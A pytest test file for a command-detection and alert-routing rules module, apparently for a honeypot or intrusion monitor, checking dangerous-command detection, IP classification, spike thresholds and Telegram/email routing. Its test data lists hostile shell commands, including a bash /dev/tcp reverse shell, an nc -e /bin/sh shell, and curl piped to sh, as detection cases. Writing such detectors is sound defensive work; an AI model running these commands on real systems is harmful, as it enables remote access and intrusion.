import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import pytest
import rules


@pytest.mark.parametrize("cmd", [
    "wget http://x/y.sh", "curl http://x | sh", "chmod +x a.sh", "chmod  +x a",
    "rm -rf /tmp/x", "WGET http://x", "bash -i >& /dev/tcp/1.2.3.4/80 0>&1", "nc -e /bin/sh 1.2.3.4 9"])
def test_dangerous(cmd):
    assert rules.is_dangerous(cmd)


@pytest.mark.parametrize("cmd", ["ls", "whoami", "cat /etc/passwd", "echo curling", "", None, 42])
def test_safe(cmd):
    assert not rules.is_dangerous(cmd)


def test_public_ip():
    assert rules.is_public_ip("8.8.8.8")
    assert not rules.is_public_ip("172.18.0.1")
    assert not rules.is_public_ip("not-an-ip")


def test_spike():
    assert rules.is_spike(1000, 100, 3, 200)
    assert not rules.is_spike(150, 10, 3, 200)    # sous le minimum absolu
    assert not rules.is_spike(500, 400, 3, 200)   # pas assez au-dessus de la normale
    assert rules.is_spike(300, 0, 3, 200)         # base nulle


def test_malicious():
    assert rules.is_malicious(85, 80)
    assert not rules.is_malicious(79, 80)
    assert not rules.is_malicious(None, 80)
    assert rules.is_malicious(None, 80, in_blocklist=True)


def test_routing_matches_spec():
    assert rules.ROUTING["brute_force"] == ("high", ["telegram"])
    assert rules.ROUTING["dangerous_command"] == ("critical", ["telegram", "email"])
    assert rules.ROUTING["malicious_ip"] == ("medium", ["email"])
    assert rules.ROUTING["file_download"] == ("high", ["telegram"])
    assert rules.ROUTING["activity_spike"] == ("medium", ["email"])
    assert "[CRITICAL]" in rules.format_alert("dangerous_command", "x")
